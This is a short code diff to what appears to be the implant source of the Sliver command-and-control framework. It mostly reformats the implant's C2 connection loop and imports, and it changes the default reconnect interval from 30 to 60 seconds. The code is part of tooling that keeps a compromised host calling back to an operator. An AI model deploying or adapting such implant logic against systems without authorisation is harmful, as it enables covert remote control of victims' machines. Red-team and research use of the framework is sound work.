@@ -23,19 +23,18 @@ import (
 	// {{if or .HTTPc2Enabled .TCPPivotc2Enabled}}
 	"net"
 	// {{end}}
-	
 
 	// {{if .Debug}}
 	"log"
 	// {{end}}
 
 	"crypto/x509"
+	"io"
 	"net/url"
 	"os"
 	"strconv"
 	"sync"
 	"time"
-	"io"
 
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 
@@ -59,7 +58,7 @@ var (
 
 	ccCounter = new(int)
 
-	activeC2 string
+	activeC2         string
 	activeConnection *Connection
 )
 
@@ -77,7 +76,7 @@ type Connection struct {
 
 // Cleanup - Execute cleanup once
 func (c *Connection) Cleanup() {
-	c.once.Do(func(){
+	c.once.Do(func() {
 		c.cleanup()
 		c.IsOpen = false
 	})
@@ -212,9 +211,9 @@ func StartConnectionLoop() *Connection {
 			log.Printf("Unknown c2 protocol %s", uri.Scheme)
 			// {{end}}
 		}
-		
+
 		// {{if .Debug}}
-		log.Printf("Sleep ...")
+		log.Printf("Sleep %d second(s) ...", reconnectInterval/time.Second)
 		// {{end}}
 		time.Sleep(reconnectInterval)
 	}
@@ -253,7 +252,7 @@ func nextCCServer() *url.URL {
 func getReconnectInterval() time.Duration {
 	reconnect, err := strconv.Atoi(`{{.ReconnectInterval}}`)
 	if err != nil {
-		return 30 * time.Second
+		return 60 * time.Second
 	}
 	return time.Duration(reconnect) * time.Second
 }
